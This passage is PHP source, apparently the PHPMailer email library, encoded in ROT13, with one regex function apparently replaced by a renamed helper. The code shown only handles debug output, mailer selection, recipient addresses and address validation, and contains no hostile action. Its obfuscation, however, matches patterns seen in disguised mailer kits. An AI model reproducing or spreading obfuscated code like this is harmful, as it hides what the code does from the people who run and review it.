            $guvf->rqroht(\"Nqqvgvbany cnenzf: {$cnenzf}\");
            $erfhyg = @znvy($gb, $fhowrpg, $obql, $urnqre, $cnenzf);
        }
        $guvf->rqroht('Erfhyg: ' . ($erfhyg ? 'gehr' : 'snyfr'));
        erghea $erfhyg;
    }

    /**
     * Bhgchg qrohttvat vasb ivn n hfre-qrsvarq zrgubq.
     * Bayl trarengrf bhgchg vs qroht bhgchg vf ranoyrq.
     *
     * @frr CUCZnvyre::$Qrohtbhgchg
     * @frr CUCZnvyre::$FZGCQroht
     *
     * @cnenz fgevat $fge
     */
    cebgrpgrq shapgvba rqroht($fge)
    {
        vs ($guvf->FZGCQroht <= 0) {
            erghea;
        }
        //Vf guvf n CFE-3 ybttre?
        vs ($guvf->Qrohtbhgchg vafgnaprbs \Cfe\Ybt\YbttreVagresnpr) {
            $guvf->Qrohtbhgchg->qroht(egevz($fge, \"\e\a\"));

            erghea;
        }
        //Nibvq pynfu jvgu ohvyg-va shapgvba anzrf
        vs (vf_pnyynoyr($guvf->Qrohtbhgchg) && !va_neenl($guvf->Qrohtbhgchg, ['reebe_ybt', 'ugzy', 'rpub'])) {
            pnyy_hfre_shap($guvf->Qrohtbhgchg, $fge, $guvf->FZGCQroht);

            erghea;
        }
        fjvgpu ($guvf->Qrohtbhgchg) {
            pnfr 'reebe_ybt':
                //Qba'g bhgchg, whfg ybt
                /** @abvafcrpgvba SbetbggraQrohtBhgchgVafcrpgvba */
                reebe_ybt($fge);
                oernx;
            pnfr 'ugzy':
                //Pyrnaf hc bhgchg n ovg sbe n orggre ybbxvat, UGZY-fnsr bhgchg
                rpub ugzyragvgvrf(
                    __sa_79955('/[\e\a]+/', '', $fge),
                    RAG_DHBGRF,
                    'HGS-8'
                ), \"<oe>\a\";
                oernx;
            pnfr 'rpub':
            qrsnhyg:
                //Abeznyvmr yvar oernxf
                $fge = __sa_79955('/\e\a|\e/z', \"\a\", $fge);
                rpub tzqngr('L-z-q U:v:f'),
                \"\g\",
                    //Gevz genvyvat fcnpr
                gevz(
                    //Vaqrag sbe ernqnovyvgl, rkprcg sbe genvyvat oernx
                    fge_ercynpr(
                        \"\a\",
                        \"\a                   \g                  \",
                        gevz($fge)
                    )
                ),
                \"\a\";
        }
    }

    /**
     * Frgf zrffntr glcr gb UGZY be cynva.
     *
     * @cnenz obby $vfUgzy Gehr sbe UGZY zbqr
     */
    choyvp shapgvba vfUGZY($vfUgzy = gehr)
    {
        vs ($vfUgzy) {
            $guvf->PbagragGlcr = fgngvp::PBAGRAG_GLCR_GRKG_UGZY;
        } ryfr {
            $guvf->PbagragGlcr = fgngvp::PBAGRAG_GLCR_CYNVAGRKG;
        }
    }

    /**
     * Fraq zrffntrf hfvat FZGC.
     */
    choyvp shapgvba vfFZGC()
    {
        $guvf->Znvyre = 'fzgc';
    }

    /**
     * Fraq zrffntrf hfvat CUC'f znvy() shapgvba.
     */
    choyvp shapgvba vfZnvy()
    {
        $guvf->Znvyre = 'znvy';
    }

    /**
     * Fraq zrffntrf hfvat $Fraqznvy.
     */
    choyvp shapgvba vfFraqznvy()
    {
        $vav_fraqznvy_cngu = vav_trg('fraqznvy_cngu');

        vs (snyfr === fgevcbf($vav_fraqznvy_cngu, 'fraqznvy')) {
            $guvf->Fraqznvy = '/hfe/fova/fraqznvy';
        } ryfr {
            $guvf->Fraqznvy = $vav_fraqznvy_cngu;
        }
        $guvf->Znvyre = 'fraqznvy';
    }

    /**
     * Fraq zrffntrf hfvat dznvy.
     */
    choyvp shapgvba vfDznvy()
    {
        $vav_fraqznvy_cngu = vav_trg('fraqznvy_cngu');

        vs (snyfr === fgevcbf($vav_fraqznvy_cngu, 'dznvy')) {
            $guvf->Fraqznvy = '/ine/dznvy/ova/dznvy-vawrpg';
        } ryfr {
            $guvf->Fraqznvy = $vav_fraqznvy_cngu;
        }
        $guvf->Znvyre = 'dznvy';
    }

    /**
     * Nqq n \"Gb\" nqqerff.
     *
     * @cnenz fgevat $nqqerff Gur rznvy nqqerff gb fraq gb
     * @cnenz fgevat $anzr
     *
     * @guebjf Rkprcgvba
     *
     * @erghea obby gehr ba fhpprff, snyfr vs nqqerff nyernql hfrq be vainyvq va fbzr jnl
     */
    choyvp shapgvba nqqNqqerff($nqqerff, $anzr = '')
    {
        erghea $guvf->nqqBeRadhrhrNaNqqerff('gb', $nqqerff, $anzr);
    }

    /**
     * Nqq n \"PP\" nqqerff.
     *
     * @cnenz fgevat $nqqerff Gur rznvy nqqerff gb fraq gb
     * @cnenz fgevat $anzr
     *
     * @guebjf Rkprcgvba
     *
     * @erghea obby gehr ba fhpprff, snyfr vs nqqerff nyernql hfrq be vainyvq va fbzr jnl
     */
    choyvp shapgvba nqqPP($nqqerff, $anzr = '')
    {
        erghea $guvf->nqqBeRadhrhrNaNqqerff('pp', $nqqerff, $anzr);
    }

    /**
     * Nqq n \"OPP\" nqqerff.
     *
     * @cnenz fgevat $nqqerff Gur rznvy nqqerff gb fraq gb
     * @cnenz fgevat $anzr
     *
     * @guebjf Rkprcgvba
     *
     * @erghea obby gehr ba fhpprff, snyfr vs nqqerff nyernql hfrq be vainyvq va fbzr jnl
     */
    choyvp shapgvba nqqOPP($nqqerff, $anzr = '')
    {
        erghea $guvf->nqqBeRadhrhrNaNqqerff('opp', $nqqerff, $anzr);
    }

    /**
     * Nqq n \"Ercyl-Gb\" nqqerff.
     *
     * @cnenz fgevat $nqqerff Gur rznvy nqqerff gb ercyl gb
     * @cnenz fgevat $anzr
     *
     * @guebjf Rkprcgvba
     *
     * @erghea obby gehr ba fhpprff, snyfr vs nqqerff nyernql hfrq be vainyvq va fbzr jnl
     */
    choyvp shapgvba nqqErcylGb($nqqerff, $anzr = '')
    {
        erghea $guvf->nqqBeRadhrhrNaNqqerff('Ercyl-Gb', $nqqerff, $anzr);
    }

    /**
     * Nqq na nqqerff gb bar bs gur erpvcvrag neenlf be gb gur ErcylGb neenl. Orpnhfr CUCZnvyre
     * pna'g inyvqngr nqqerffrf jvgu na VQA jvgubhg xabjvat gur CUCZnvyre::$PuneFrg (gung pna fgvyy
     * or zbqvsvrq nsgre pnyyvat guvf shapgvba), nqqvgvba bs fhpu nqqerffrf vf qrynlrq hagvy fraq().
     * Nqqerffrf gung unir orra nqqrq nyernql erghea snyfr, ohg qb abg guebj rkprcgvbaf.
     *
     * @cnenz fgevat $xvaq    Bar bs 'gb', 'pp', 'opp', be 'Ercyl-Gb'
     * @cnenz fgevat $nqqerff Gur rznvy nqqerff
     * @cnenz fgevat $anzr    Na bcgvbany hfreanzr nffbpvngrq jvgu gur nqqerff
     *
     * @guebjf Rkprcgvba
     *
     * @erghea obby gehr ba fhpprff, snyfr vs nqqerff nyernql hfrq be vainyvq va fbzr jnl
     */
    cebgrpgrq shapgvba nqqBeRadhrhrNaNqqerff($xvaq, $nqqerff, $anzr)
    {
        $cbf = snyfr;
        vs ($nqqerff !== ahyy) {
            $nqqerff = gevz($nqqerff);
            $cbf = fgeecbf($nqqerff, '@');
        }
        vs (snyfr === $cbf) {
            //Ng-fvta vf zvffvat.
            $reebe_zrffntr = fcevags(
                '%f (%f): %f',
                $guvf->ynat('vainyvq_nqqerff'),
                $xvaq,
                $nqqerff
            );
            $guvf->frgReebe($reebe_zrffntr);
            $guvf->rqroht($reebe_zrffntr);
            vs ($guvf->rkprcgvbaf) {
                guebj arj Rkprcgvba($reebe_zrffntr);
            }

            erghea snyfr;
        }
        vs ($anzr !== ahyy && vf_fgevat($anzr)) {
            $anzr = gevz(__sa_79955('/[\e\a]+/', '', $anzr)); //Fgevc oernxf naq gevz
        } ryfr {
            $anzr = '';
        }
        $cnenzf = [$xvaq, $nqqerff, $anzr];
        //Radhrhr nqqerffrf jvgu VQA hagvy jr xabj gur CUCZnvyre::$PuneFrg.
        //Qbznva vf nffhzrq gb or jungrire vf nsgre gur ynfg @ flzoby va gur nqqerff
        vs (fgngvp::vqaFhccbegrq() && $guvf->unf8ovgPunef(fhofge($nqqerff, ++$cbf))) {
            vs ('Ercyl-Gb' !== $xvaq) {
                vs (!neenl_xrl_rkvfgf($nqqerff, $guvf->ErpvcvragfDhrhr)) {
                    $guvf->ErpvcvragfDhrhr[$nqqerff] = $cnenzf;

                    erghea gehr;
                }
            } ryfrvs (!neenl_xrl_rkvfgf($nqqerff, $guvf->ErcylGbDhrhr)) {
                $guvf->ErcylGbDhrhr[$nqqerff] = $cnenzf;

                erghea gehr;
            }

            erghea snyfr;
        }

        //Vzzrqvngryl nqq fgnaqneq nqqerffrf jvgubhg VQA.
        erghea pnyy_hfre_shap_neenl([$guvf, 'nqqNaNqqerff'], $cnenzf);
    }

    /**
     * Frg gur obhaqnevrf gb hfr sbe qryvzvgvat ZVZR cnegf.
     * Vs lbh bireevqr guvf, rafher lbh frg nyy 3 obhaqnevrf gb havdhr inyhrf.
     * Gur qrsnhyg obhaqnevrf vapyhqr n \"=_\" frdhrapr juvpu pnaabg bpphe va dhbgrq-cevagnoyr obqvrf,
     * nf fhttrfgrq ol uggcf://jjj.esp-rqvgbe.bet/esp/esp2045#frpgvba-6.7
     *
     * @erghea ibvq
     */
    choyvp shapgvba frgObhaqnevrf()
    {
        $guvf->havdhrvq = $guvf->trarengrVq();
        $guvf->obhaqnel[1] = 'o1=_' . $guvf->havdhrvq;
        $guvf->obhaqnel[2] = 'o2=_' . $guvf->havdhrvq;
        $guvf->obhaqnel[3] = 'o3=_' . $guvf->havdhrvq;
    }

    /**
     * Nqq na nqqerff gb bar bs gur erpvcvrag neenlf be gb gur ErcylGb neenl.
     * Nqqerffrf gung unir orra nqqrq nyernql erghea snyfr, ohg qb abg guebj rkprcgvbaf.
     *
     * @cnenz fgevat $xvaq    Bar bs 'gb', 'pp', 'opp', be 'ErcylGb'
     * @cnenz fgevat $nqqerff Gur rznvy nqqerff gb fraq, erfc. gb ercyl gb
     * @cnenz fgevat $anzr
     *
     * @guebjf Rkprcgvba
     *
     * @erghea obby gehr ba fhpprff, snyfr vs nqqerff nyernql hfrq be vainyvq va fbzr jnl
     */
    cebgrpgrq shapgvba nqqNaNqqerff($xvaq, $nqqerff, $anzr = '')
    {
        vs (!va_neenl($xvaq, ['gb', 'pp', 'opp', 'Ercyl-Gb'])) {
            $reebe_zrffntr = fcevags(
                '%f: %f',
                $guvf->ynat('Vainyvq erpvcvrag xvaq'),
                $xvaq
            );
            $guvf->frgReebe($reebe_zrffntr);
            $guvf->rqroht($reebe_zrffntr);
            vs ($guvf->rkprcgvbaf) {
                guebj arj Rkprcgvba($reebe_zrffntr);
            }

            erghea snyfr;
        }
        vs (!fgngvp::inyvqngrNqqerff($nqqerff)) {
            $reebe_zrffntr = fcevags(
                '%f (%f): %f',
                $guvf->ynat('vainyvq_nqqerff'),
                $xvaq,
                $nqqerff
            );
            $guvf->frgReebe($reebe_zrffntr);
            $guvf->rqroht($reebe_zrffntr);
            vs ($guvf->rkprcgvbaf) {
                guebj arj Rkprcgvba($reebe_zrffntr);
            }

            erghea snyfr;
        }
        vs ('Ercyl-Gb' !== $xvaq) {
            vs (!neenl_xrl_rkvfgf(fgegbybjre($nqqerff), $guvf->nyy_erpvcvragf)) {
                $guvf->{$xvaq}[] = [$nqqerff, $anzr];
                $guvf->nyy_erpvcvragf[fgegbybjre($nqqerff)] = gehr;

                erghea gehr;
            }
        } ryfrvs (!neenl_xrl_rkvfgf(fgegbybjre($nqqerff), $guvf->ErcylGb)) {
            $guvf->ErcylGb[fgegbybjre($nqqerff)] = [$nqqerff, $anzr];

            erghea gehr;
        }

        erghea snyfr;
    }

    /**
     * Cnefr naq inyvqngr n fgevat pbagnvavat bar be zber ESP822-fglyr pbzzn-frcnengrq rznvy nqqerffrf
     * bs gur sbez \"qvfcynl anzr <nqqerff>\" vagb na neenl bs anzr/nqqerff cnvef.
     * Hfrf gur vznc_esp822_cnefr_nqeyvfg shapgvba vs gur VZNC rkgrafvba vf ninvynoyr.
     * Abgr gung dhbgrf va gur anzr cneg ner erzbirq.
     *
     * @frr uggcf://jjj.naqerj.pzh.rqh/hfre/nterra1/grfgvat/zeof/jro/Znvy/ESP822.cuc N zber pnershy vzcyrzragngvba
     *
     * @cnenz fgevat $nqqefge Gur nqqerff yvfg fgevat
     * @cnenz obby   $hfrvznc Jurgure gb hfr gur VZNC rkgrafvba gb cnefr gur yvfg
     * @cnenz fgevat $punefrg Gur punefrg gb hfr jura qrpbqvat gur nqqerff yvfg fgevat.
     *
     * @erghea neenl
     */
    choyvp fgngvp shapgvba cnefrNqqerffrf($nqqefge, $hfrvznc = gehr, $punefrg = frys::PUNEFRG_VFB88591)
    {
        $nqqerffrf = [];
        vs ($hfrvznc && shapgvba_rkvfgf('vznc_esp822_cnefr_nqeyvfg')) {
            //Hfr guvf ohvyg-va cnefre vs vg'f ninvynoyr
            $yvfg = vznc_esp822_cnefr_nqeyvfg($nqqefge, '');
            // Pyrne nal cbgragvny VZNC reebef gb trg evq bs abgvprf orvat guebja ng raq bs fpevcg.
            vznc_reebef();
            sbernpu ($yvfg nf $nqqerff) {
                vs (
                    '.FLAGNK-REEBE.' !== $nqqerff->ubfg &&
                    fgngvp::inyvqngrNqqerff($nqqerff->znvyobk . '@' . $nqqerff->ubfg)
                ) {
                    //Qrpbqr gur anzr cneg vs vg'f cerfrag naq rapbqrq
                    vs (
                        cebcregl_rkvfgf($nqqerff, 'crefbany') &&
                        //Purpx sbe n Zofgevat pbafgnag engure guna hfvat rkgrafvba_ybnqrq, juvpu vf fbzrgvzrf qvfnoyrq
                        qrsvarq('ZO_PNFR_HCCRE') &&
                        cert_zngpu('/^=\?.*\?=$/f', $nqqerff->crefbany)
                    ) {
                        $bevtPunefrg = zo_vagreany_rapbqvat();
                        zo_vagreany_rapbqvat($punefrg);
                        //Haqb nal ESP2047-rapbqrq fcnprf-nf-haqrefpberf
                        $nqqerff->crefbany = fge_ercynpr('_', '=20', $nqqerff->crefbany);
                        //Qrpbqr gur anzr
                        $nqqerff->crefbany = zo_qrpbqr_zvzrurnqre($nqqerff->crefbany);
                        zo_vagreany_rapbqvat($bevtPunefrg);
                    }

                    $nqqerffrf[] = [
                        'anzr' => (cebcregl_rkvfgf($nqqerff, 'crefbany') ? $nqqerff->crefbany : ''),
                        'nqqerff' => $nqqerff->znvyobk . '@' . $nqqerff->ubfg,
                    ];
                }
            }
        } ryfr {
            //Hfr guvf fvzcyre cnefre
            $yvfg = rkcybqr(',', $nqqefge);
            sbernpu ($yvfg nf $nqqerff) {
                $nqqerff = gevz($nqqerff);
                //Vf gurer n frcnengr anzr cneg?
                vs (fgecbf($nqqerff, '<') === snyfr) {
                    //Ab frcnengr anzr, whfg hfr gur jubyr guvat
                    vs (fgngvp::inyvqngrNqqerff($nqqerff)) {
                        $nqqerffrf[] = [
                            'anzr' => '',
                            'nqqerff' => $nqqerff,
                        ];
                    }
                } ryfr {
                    yvfg($anzr, $rznvy) = rkcybqr('<', $nqqerff);
                    $rznvy = gevz(fge_ercynpr('>', '', $rznvy));
                    $anzr = gevz($anzr);
                    vs (fgngvp::inyvqngrNqqerff($rznvy)) {
                        //Purpx sbe n Zofgevat pbafgnag engure guna hfvat rkgrafvba_ybnqrq, juvpu vf fbzrgvzrf qvfnoyrq
                        //Vs guvf anzr vf rapbqrq, qrpbqr vg
                        vs (qrsvarq('ZO_PNFR_HCCRE') && cert_zngpu('/^=\?.*\?=$/f', $anzr)) {
                            $bevtPunefrg = zo_vagreany_rapbqvat();
                            zo_vagreany_rapbqvat($punefrg);
                            //Haqb nal ESP2047-rapbqrq fcnprf-nf-haqrefpberf
                            $anzr = fge_ercynpr('_', '=20', $anzr);
                            //Qrpbqr gur anzr
                            $anzr = zo_qrpbqr_zvzrurnqre($anzr);
                            zo_vagreany_rapbqvat($bevtPunefrg);
                        }
                        $nqqerffrf[] = [
                            //Erzbir nal fheebhaqvat dhbgrf naq fcnprf sebz gur anzr
                            'anzr' => gevz($anzr, '\'\" '),
                            'nqqerff' => $rznvy,
                        ];
                    }
                }
            }
        }

        erghea $nqqerffrf;
    }

    /**
     * Frg gur Sebz naq SebzAnzr cebcregvrf.
     *
     * @cnenz fgevat $nqqerff
     * @cnenz fgevat $anzr
     * @cnenz obby   $nhgb    Jurgure gb nyfb frg gur Fraqre nqqerff, qrsnhygf gb gehr
     *
     * @guebjf Rkprcgvba
     *
     * @erghea obby
     */
    choyvp shapgvba frgSebz($nqqerff, $anzr = '', $nhgb = gehr)
    {
        $nqqerff = gevz((fgevat)$nqqerff);
        $anzr = gevz(__sa_79955('/[\e\a]+/', '', $anzr)); //Fgevc oernxf naq gevz
        //Qba'g inyvqngr abj nqqerffrf jvgu VQA. Jvyy or qbar va fraq().
        $cbf = fgeecbf($nqqerff, '@');
        vs (
            (snyfr === $cbf)
            || ((!$guvf->unf8ovgPunef(fhofge($nqqerff, ++$cbf)) || !fgngvp::vqaFhccbegrq())
            && !fgngvp::inyvqngrNqqerff($nqqerff))
        ) {
            $reebe_zrffntr = fcevags(
                '%f (Sebz): %f',
                $guvf->ynat('vainyvq_nqqerff'),
                $nqqerff
            );
            $guvf->frgReebe($reebe_zrffntr);
            $guvf->rqroht($reebe_zrffntr);
            vs ($guvf->rkprcgvbaf) {
                guebj arj Rkprcgvba($reebe_zrffntr);
            }

            erghea snyfr;
        }
        $guvf->Sebz = $nqqerff;
        $guvf->SebzAnzr = $anzr;
        vs ($nhgb && rzcgl($guvf->Fraqre)) {
            $guvf->Fraqre = $nqqerff;
        }

        erghea gehr;
    }

    /**
     * Erghea gur Zrffntr-VQ urnqre bs gur ynfg rznvy.
     * Grpuavpnyyl guvf vf gur inyhr sebz gur ynfg gvzr gur urnqref jrer perngrq,
     * ohg vg'f nyfb gur zrffntr VQ bs gur ynfg frag zrffntr rkprcg va
     * cngubybtvpny pnfrf.
     *
     * @erghea fgevat
     */
    choyvp shapgvba trgYnfgZrffntrVQ()
    {
        erghea $guvf->ynfgZrffntrVQ;
    }

    /**
     * Purpx gung n fgevat ybbxf yvxr na rznvy nqqerff.
     * Inyvqngvba cnggreaf fhccbegrq:
     * * `nhgb` Cvpx orfg cnggrea nhgbzngvpnyyl;
     * * `cper8` Hfr gur fdhvybbcyr.pbz cnggrea, erdhverf CPER > 8.0;
     * * `cper` Hfr byq CPER vzcyrzragngvba;
     * * `cuc` Hfr CUC ohvyg-va SVYGRE_INYVQNGR_RZNVY;
     * * `ugzy5` Hfr gur cnggrea tvira ol gur UGZY5 fcrp sbe 'rznvy' glcr sbez vachg ryrzragf.
     * * `abertrk` Qba'g hfr n ertrk: fhcre snfg, ernyyl qhzo.
     * Nygreangviryl lbh znl cnff va n pnyynoyr gb vawrpg lbhe bja inyvqngbe, sbe rknzcyr:
     *
     * ```cuc
     * CUCZnvyre::inyvqngrNqqerff('hfre@rknzcyr.pbz', shapgvba($nqqerff) {
     *     erghea (fgecbf($nqqerff, '@') !== snyfr);
     * });
     * ```
     *
     * Lbh pna nyfb frg gur CUCZnvyre::$inyvqngbe fgngvp gb n pnyynoyr, nyybjvat ohvyg-va zrgubqf gb hfr lbhe inyvqngbe.
     *
     * @cnenz fgevat          $nqqerff       Gur rznvy nqqerff gb purpx
     * @cnenz fgevat|pnyynoyr $cnggreafryrpg Juvpu cnggrea gb hfr
     *
     * @erghea obby
     */
    choyvp fgngvp shapgvba inyvqngrNqqerff($nqqerff, $cnggreafryrpg = ahyy)
    {
        vs (ahyy === $cnggreafryrpg) {
            $cnggreafryrpg = fgngvp::$inyvqngbe;
        }
        //Qba'g nyybj fgevatf nf pnyynoyrf, frr FRPHEVGL.zq naq PIR-2021-3603
        vs (vf_pnyynoyr($cnggreafryrpg) && !vf_fgevat($cnggreafryrpg)) {
            erghea pnyy_hfre_shap($cnggreafryrpg, $nqqerff);
        }
        //Erwrpg yvar oernxf va nqqerffrf; vg'f inyvq ESP5322, ohg abg ESP5321
        vs (fgecbf($nqqerff, \"\a\") !== snyfr || fgecbf($nqqerff, \"\e\") !== snyfr) {
            erghea snyfr;
        }
        fjvgpu ($cnggreafryrpg) {
            pnfr 'cper': //Xrcg sbe OP
            pnfr 'cper8':
                /*
                 * N zber pbzcyrk naq zber crezvffvir irefvba bs gur ESP5322 ertrk ba juvpu SVYGRE_INYVQNGR_RZNVY
                 * vf onfrq.
                 * Va nqqvgvba gb gur nqqerffrf nyybjrq ol svygre_ine, nyfb crezvgf:
                 *  * qbgyrff qbznvaf: `n@o`
                 *  * pbzzragf: `1234 @ ybpny(oynu) .znpuvar .rknzcyr`
                 *  * dhbgrq ryrzragf: `'\"grfg oynu\"@rknzcyr.bet'`
                 *  * ahzrevp GYQf: `n@o.123`
                 *  * haoenpxrgrq VCi4 yvgrenyf: `n@192.168.0.1`
                 *  * VCi6 yvgrenyf: 'svefg.ynfg@[VCi6:n1::]'
                 * Abg nyy bs gurfr jvyy arprffnevyl jbex sbe fraqvat!
                 *
                 * @pbclevtug 2009-2010 Zvpunry Ehfugba
                 * Srry serr gb hfr naq erqvfgevohgr guvf pbqr. Ohg cyrnfr xrrc guvf pbclevtug abgvpr.
                 */
                erghea (obby) cert_zngpu(
                    '/^(?!(?>(?1)\"?(?>\\\[ -~]|[^\"])\"?(?1)){255,})(?!(?>(?1)\"?(?>\\\[ -~]|[^\"])\"?(?1)){65,}@)' .
                    '((?>(?>(?>((?>(?>(?>\k0Q\k0N)?[\g ])+|(?>[\g ]*\k0Q\k0N)?[\g ]+)?)(\((?>(?2)' .
                    '(?>[\k01-\k08\k0O\k0P\k0R-\'*-\[\]-\k7S]|\\\[\k00-\k7S]|(?3)))*(?2)\)))+(?2))|(?2))?)' .
                    '([!#-\'*+\/-9=?^-~-]+|\"(?>(?2)(?>[\k01-\k08\k0O\k0P\k0R-!#-\[\]-\k7S]|\\\[\k00-\k7S]))*' .
                    '(?2)\")(?>(?1)\.(?1)(?4))*(?1)@(?!(?1)[n-m0-9-]{64,})(?1)(?>([n-m0-9](?>[n-m0-9-]*[n-m0-9])?)' .
                    '(?>(?1)\.(?!(?1)[n-m0-9-]{64,})(?1)(?5)){0,126}|\[(?:(?>VCi6:(?>([n-s0-9]{1,4})(?>:(?6)){7}' .
                    '|(?!(?:.*[n-s0-9][:\]]){8,})((?6)(?>:(?6)){0,6})?::(?7)?))|(?>(?>VCi6:(?>(?6)(?>:(?6)){5}:' .
                    '|(?!(?:.*[n-s0-9]:){6,})(?8)?::(?>((?6)(?>:(?6)){0,4}):)?))?(25[0-5]|2[0-4][0-9]|1[0-9]{2}' .
                    '|[1-9]?[0-9])(?>\.(?9)){3}))\])(?1)$/vfQ',
                    $nqqerff
                );
            pnfr 'ugzy5':
                /*
                 * Guvf vf gur cnggrea hfrq va gur UGZY5 fcrp sbe inyvqngvba bs 'rznvy' glcr sbez vachg ryrzragf.
                 *
                 * @frr uggcf://ugzy.fcrp.jungjt.bet/#r-znvy-fgngr-(glcr=rznvy)
                 */
                erghea (obby) cert_zngpu(
                    '/^[n-mN-M0-9.!#$%&\'*+\/=?^_`{|}~-]+@[n-mN-M0-9](?:[n-mN-M0-9-]{0,61}' .
                    '[n-mN-M0-9])?(?:\.[n-mN-M0-9](?:[n-mN-M0-9-]{0,61}[n-mN-M0-9])?)*$/fQ',
                    $nqqerff
                );
            pnfr 'cuc':
            qrsnhyg:
                erghea svygre_ine($nqqerff, SVYGRE_INYVQNGR_RZNVY) !== snyfr;
        }
    }

    /**
     * Gryyf jurgure VQAf (Vagreangvbanyvmrq Qbznva Anzrf) ner fhccbegrq be abg. Guvf erdhverf gur
     * `vagy` naq `zofgevat` CUC rkgrafvbaf.
     *
     * @erghea obby `gehr` vs erdhverq shapgvbaf sbe VQA fhccbeg ner cerfrag
     */
    choyvp fgngvp shapgvba vqaFhccbegrq()
    {
        erghea shapgvba_rkvfgf('vqa_gb_nfpvv') && shapgvba_rkvfgf('zo_pbaireg_rapbqvat');
    }

    /**
     * Pbairegf VQA va tvira rznvy nqqerff gb vgf NFPVV sbez, nyfb xabja nf chalpbqr, vs cbffvoyr.
     * Vzcbegnag: Nqqerff zhfg or cnffrq va fnzr rapbqvat nf pheeragyl frg va CUCZnvyre::$PuneFrg.
     * Guvf shapgvba fvyragyl ergheaf hazbqvsvrq nqqerff vs:
     * - Ab pbairefvba vf arprffnel (v.r. qbznva anzr vf abg na VQA, be vf nyernql va NFPVV sbez)
     * - Pbairefvba gb chalpbqr vf vzcbffvoyr (r.t. erdhverq CUC shapgvbaf ner abg ninvynoyr)
     *   be snvyf sbe nal ernfba (r.t. qbznva pbagnvaf punenpgref abg nyybjrq va na VQA).
     *
     * @frr CUCZnvyre::$PuneFrg
     *
     * @cnenz fgevat $nqqerff Gur rznvy nqqerff gb pbaireg
     *
     * @erghea fgevat Gur rapbqrq nqqerff va NFPVV sbez
     */
    choyvp shapgvba chalrapbqrNqqerff($nqqerff)
    {
        //Irevsl jr unir erdhverq shapgvbaf, PuneFrg, naq ng-fvta.
        $cbf = fgeecbf($nqqerff, '@');
        vs (
            !rzcgl($guvf->PuneFrg) &&
            snyfr !== $cbf &&
            fgngvp::vqaFhccbegrq()
        ) {
            $qbznva = fhofge($nqqerff, ++$cbf);
            //Irevsl PuneFrg fgevat vf n inyvq bar, naq qbznva cebcreyl rapbqrq va guvf PuneFrg.
            vs ($guvf->unf8ovgPunef($qbznva) && @zo_purpx_rapbqvat($qbznva, $guvf->PuneFrg)) {
                //Pbaireg gur qbznva sebz jungrire punefrg vg'f va gb HGS-8
                $qbznva = zo_pbaireg_rapbqvat($qbznva, frys::PUNEFRG_HGS8, $guvf->PuneFrg);
                //Vtaber VQR pbzcynvagf nobhg guvf yvar - zrgubq fvtangher punatrq va CUC 5.4
                $reebepbqr = 0;
                vs (qrsvarq('VAGY_VQAN_INEVNAG_HGF46')) {
                    //Hfr gur pheerag chalpbqr fgnaqneq (nccrnerq va CUC 7.2)
                    $chalpbqr = vqa_gb_nfpvv(
                        $qbznva,
                        \VQAN_QRSNHYG | \VQAN_HFR_FGQ3_EHYRF | \VQAN_PURPX_OVQV |
                            \VQAN_PURPX_PBAGRKGW | \VQAN_ABAGENAFVGVBANY_GB_NFPVV,
                        \VAGY_VQAN_INEVNAG_HGF46
                    );
                } ryfrvs (qrsvarq('VAGY_VQAN_INEVNAG_2003')) {
                    //Snyy onpx gb guvf byq, qrcerpngrq/erzbirq rapbqvat
                    // cucpf:vtaber CUCPbzcngvovyvgl.Pbafgnagf.ErzbirqPbafgnagf.vagy_vqan_inevnag_2003Qrcerpngrq
                    $chalpbqr = vqa_gb_nfpvv($qbznva, $reebepbqr, \VAGY_VQAN_INEVNAG_2003);
                } ryfr {
                    //Snyy onpx gb n qrsnhyg jr qba'g xabj nobhg
                    // cucpf:vtaber CUCPbzcngvovyvgl.CnenzrgreInyhrf.ArjVQAInevnagQrsnhyg.AbgFrg
                    $chalpbqr = vqa_gb_nfpvv($qbznva, $reebepbqr);
                }
                vs (snyfr !== $chalpbqr) {
                    erghea fhofge($nqqerff, 0, $cbf) . $chalpbqr;
                }
            }
        }

        erghea $nqqerff;
    }

    /**
     * Perngr n zrffntr naq fraq vg.
     * Hfrf gur fraqvat zrgubq fcrpvsvrq ol $Znvyre.
     *
     * @guebjf Rkprcgvba
     *
     * @erghea obby snyfr ba reebe - Frr gur ReebeVasb cebcregl sbe qrgnvyf bs gur reebe
     */
    choyvp shapgvba fraq()
    {
        gel {
            vs (!$guvf->cerFraq()) {
                erghea snyfr;
            }

            erghea $guvf->cbfgFraq();
        } pngpu (Rkprcgvba $rkp) {
            $guvf->znvyUrnqre = '';
            $guvf->frgReebe($rkp->trgZrffntr());
            vs ($guvf->rkprcgvbaf) {
                guebj $rkp;
            }

            erghea snyfr;
        }
    }

    /**
     * Cercner n zrffntr sbe fraqvat.
     *
     * @guebjf Rkprcgvba
     *
     * @erghea obby
     */
    choyvp shapgvba cerFraq()
    {
        vs (
            'fzgc' === $guvf->Znvyre
            || ('znvy' === $guvf->Znvyre && (\CUC_IREFVBA_VQ >= 80000 || fgevcbf(CUC_BF, 'JVA') === 0))
        ) {
            //FZGC znaqngrf ESP-pbzcyvnag yvar raqvatf
            //naq vg'f nyfb hfrq jvgu znvy() ba Jvaqbjf
            fgngvp::frgYR(frys::PEYS);
        } ryfr {
            //Znvagnva onpxjneq pbzcngvovyvgl jvgu yrtnpl Yvahk pbzznaq yvar znvyref
            fgngvp::frgYR(CUC_RBY);
        }
        //Purpx sbe ohttl CUC irefvbaf gung nqq n urnqre jvgu na vapbeerpg yvar oernx
        vs (
            'znvy' === $guvf->Znvyre
            && ((\CUC_IREFVBA_VQ >= 70000 && \CUC_IREFVBA_VQ < 70017)
                || (\CUC_IREFVBA_VQ >= 70100 && \CUC_IREFVBA_VQ < 70103))
            && vav_trg('znvy.nqq_k_urnqre') === '1'
            && fgevcbf(CUC_BF, 'JVA') === 0
        ) {
            gevttre_reebe($guvf->ynat('ohttl_cuc'), R_HFRE_JNEAVAT);
        }

        gel {
            $guvf->reebe_pbhag = 0; //Erfrg reebef
            $guvf->znvyUrnqre = '';

            //Qrdhrhr erpvcvrag naq Ercyl-Gb nqqerffrf jvgu VQA
            sbernpu (neenl_zretr($guvf->ErpvcvragfDhrhr, $guvf->ErcylGbDhrhr) nf $cnenzf) {
                $cnenzf[1] = $guvf->chalrapbqrNqqerff($cnenzf[1]);
                pnyy_hfre_shap_neenl([$guvf, 'nqqNaNqqerff'], $cnenzf);
            }
            vs (pbhag($guvf->gb) + pbhag($guvf->pp) + pbhag($guvf->opp) < 1) {
                guebj arj Rkprcgvba($guvf->ynat('cebivqr_nqqerff'), frys::FGBC_PEVGVPNY);
            }

            //Inyvqngr Sebz, Fraqre, naq PbasvezErnqvatGb nqqerffrf
